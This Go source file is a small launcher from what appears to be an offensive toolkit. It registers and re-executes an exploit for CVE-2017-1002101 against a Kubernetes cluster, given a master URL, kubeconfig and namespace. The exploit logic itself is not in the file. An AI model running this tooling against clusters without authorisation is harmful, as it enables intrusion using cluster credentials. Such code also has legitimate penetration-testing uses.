package CVE_2017_1002101

import (
	"github.com/docker/docker/pkg/reexec"
	"os"
)

func init() {
	reexec.Register(ExpName, Exploit)
}

func InvokeExploit(masterUrl, kubeConfigPath, namespace string, debug bool) error {
	args := []string{
		ExpName,
	}
	if debug {
		args = append(args, "--debug")
	}
	args = append(args, "--master_url", masterUrl)
	args = append(args, "--kubeconfig", kubeConfigPath)
	args = append(args, "--namespace", namespace)
	cmd := reexec.Command(args...)
	cmd.Stderr = os.Stderr
	cmd.Stdout = os.Stdout
	cmd.Stdin = os.Stdin
	return cmd.Run()
}
